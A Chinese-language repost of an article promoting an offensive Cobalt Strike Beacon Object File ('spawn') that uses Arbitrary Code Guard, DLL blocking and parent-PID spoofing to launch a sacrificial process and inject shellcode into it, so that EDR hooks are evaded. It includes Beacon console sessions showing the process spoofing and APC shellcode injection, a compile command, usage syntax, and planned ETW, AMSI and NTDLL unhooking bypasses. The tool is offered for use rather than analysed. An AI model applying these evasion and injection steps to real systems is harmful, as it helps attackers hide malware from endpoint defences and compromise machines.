> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qEBVvWBnN004mJlLn2WgaA)

        Cobalt Strike BOF 产生一个牺牲进程，用 shellcode 注入它，并执行有效载荷。旨在通过使用任意代码保护 (ACG)、BlockDll 和 PPID 欺骗生成牺牲进程来逃避 EDR/UserLand 钩子。

功能

*   使用任意代码保护 (ACG) 生成牺牲进程，以防止 EDR 解决方案挂接到牺牲进程 DLL 中。
    
*   注入并执行 shellcode。
    

来自 ACG Protected Process 的 Popin' Calc

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3Jw7ibMfs6QuXkibpHLeXicVn7ls4hXwNjqomHaiasN2wcFG8tKITxRtku2h8cNHnOCjkCeBeQ80EElg/640?wx_fmt=png)

```
beacon> spawn notepad.exe 6248 /Users/bobby.cooke/git/boku7/SPAWN/popCalc.bin
[*] SPAWN (Bobby Cooke//SpiderLabs|@0xBoku|github.com/boku7)
[+] Opened handle 0x534 to process 6248(PID)
[+] Spawned process: notepad.exe | PID: 8404 | PPID: 6248
[+] Allocated RE memory in remote process 8404 (PID) at: 0x00000177A72C0000
[+] Wrote 280 bytes to memory in remote process 8404 (PID) at 0x00000177A72C0000
[+] APC queued for main thread of 8404 (PID) to shellcode address 0x00000177A72C0000
```

*   CNA Agressor 脚本接口
    

```
beacon> help
    spawn                     Spawn a process with a spoofed PPID and blockDll
beacon> help spawn
Synopsis: spawn /path/to/exe PPID
beacon> ps
8264  5536  OneDrive.exe                 x86   1           DESKTOP-KOSR2NO\boku 
beacon> spawn cmd.exe 8264
[*] SPAWN (@0xBoku|github.com/boku7)
Opened handle 0x634 to process 8264(PID)
Success! Spawned process: cmd.exe | PID: 5384 | PPID: 8264
```

*   PPID 欺骗
    
*   Cobalt Strike`blockdll`功能
    

### 使用 x64 MinGW 编译：

```
x86_64-w64-mingw32-gcc -c spawn.x64.c -o spawn.x64.o
```

### 从 Cobalt Strike Beacon 控制台运行

*   编译后将 spawn.cna 脚本导入 Cobalt Strikes Script Manager
    

```
beacon> spawn /path/to/exe PPID /local/path/to/shellcode.bin
```

`cmd.exe`进程与 PPID 一起生成为`OneDrive.exe`

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3Jw7ibMfs6QuXkibpHLeXicVnmUNw2j7rFXx9BS0JGp2Ys6ibp8Q77Dl8DTDpzzS8zO6NyspSZMs3rgQ/640?wx_fmt=png)

*   我们看到了父子进程关系，并且我们生成的进程是用 `Signatures restricted (Microsoft only)`
    
*   这`Signatures restricted (Microsoft only)`使得未由 Microsoft 签名的 DLL 无法加载到我们生成的进程中
    

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3Jw7ibMfs6QuXkibpHLeXicVnZAiaibGsNibvsmBRd1T3iahELtFAKZYHeHI2NtiapH2PVlGAMTeu6wk5dzA/640?wx_fmt=png)

构建远程进程修补的不同方法

*   NTDLL.DLL 远程进程脱钩
    
*   ETW 远程进程修补 / 绕过
    
*   AMSI 远程进程修补 / 绕过
    
*   CLR 加载和 .Net 程序集注入
    

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3Jw7ibMfs6QuXkibpHLeXicVnGGRzy6Hxd26tQTFTE8gbF7qvpLmAsIOb2cibNdT6Kp9eo0VkFKQJ5PQ/640?wx_fmt=png)

项目地址：

https://github.com/boku7/spawn